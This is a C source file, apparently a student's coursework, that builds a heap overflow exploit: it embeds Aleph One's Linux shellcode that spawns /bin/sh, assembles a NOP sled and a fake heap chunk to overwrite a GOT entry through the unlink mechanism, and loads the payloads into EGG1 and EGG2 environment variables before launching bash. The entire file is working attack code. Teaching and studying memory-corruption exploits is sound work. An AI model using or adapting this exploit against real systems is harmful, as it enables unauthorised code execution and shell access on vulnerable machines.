//Author: Priyanka Saha
//KUID : 2914721

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define ENV_STRING1 "EGG1="
#define ENV_STRING2 "EGG2="

/*
Aleph1's Linux shellcode
from "Smashing the stack for fun and profit",
Phrack 49, vol 7
*/
char shellcode[] =
   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
   "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(int argc, char *argv[])
{
  char *new_buff1, *new_buff2, *command_buff1, *command_buff2;
  long next = 0xffffffff, where, what, *ptr;

  int bsize, command_bsize1, command_bsize2, env_offset1, env_offset2;

  if (argc < 4){
    printf("Usage: ./heap_exploit <buflen> <addr_GOT> <addr_buffer>\n");
    return -1;
  }

  bsize = atoi(argv[1]);
  sscanf(argv[2], "%x", &where);
  sscanf(argv[3], "%x", &what);

  printf("Length of shell code: %d\n", strlen(shellcode));
  if (bsize < strlen(shellcode) + 20){
    printf("Length of buffer is too small to contain the shell code.\n ");
    exit(0);
  }
  printf("Using where: 0x%x\n", where-12);
  printf("Using what: 0x%x\n", what+8);


  char *prefix = "XXXXYYYY"; // placeholders for forward and back links
  char *nop_jmp = "\x90\x90\x90\x90\x90\x90\xEB\x04";  // 6 NOPs, JMP +4
  char *overwrite = "ZZZZ";         //P->next->prev = P->prev. overwritten
  char padding[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";

  if(!(new_buff1 = malloc(bsize))) {
    printf("Can't allocate exploit buffer.\n");
    return 0;
  }

  strcpy(new_buff1, prefix);
  strcat(new_buff1, nop_jmp);
  strcat(new_buff1, overwrite);
  strcat(new_buff1, shellcode);


  if(!(new_buff2 = malloc(bsize))) {
    printf("Can't allocate exploit buffer.\n");
    return 0;
  }

  // Add padding to the beginning of second exploit string
  strcpy(new_buff2, padding);

  // creating a fake heap structure
  ptr = (long *)(new_buff2 + strlen(new_buff2));
  *ptr = *(ptr+1) = next;
  *(ptr+2) = where - 12;
  *(ptr+3) = what + 8;

  env_offset1 = strlen(ENV_STRING1);
  env_offset2 = strlen(ENV_STRING2);

  command_bsize1 = env_offset1 + strlen(new_buff1);
  command_bsize2 = env_offset2 + strlen(new_buff2);

  if(!(command_buff1 = malloc(command_bsize1))) {
    printf("Can't allocate command buffer.\n");
    return 0;
  }

  if(!(command_buff2 = malloc(command_bsize2))) {
    printf("Can't allocate command buffer.\n");
    return 0;
  }

  strcpy(command_buff1, ENV_STRING1);
  strcat(command_buff1, new_buff1);

  strcpy(command_buff2, ENV_STRING2);
  strcat(command_buff2, new_buff2);

  putenv(command_buff1);
  putenv(command_buff2);

  system("/bin/bash");
}
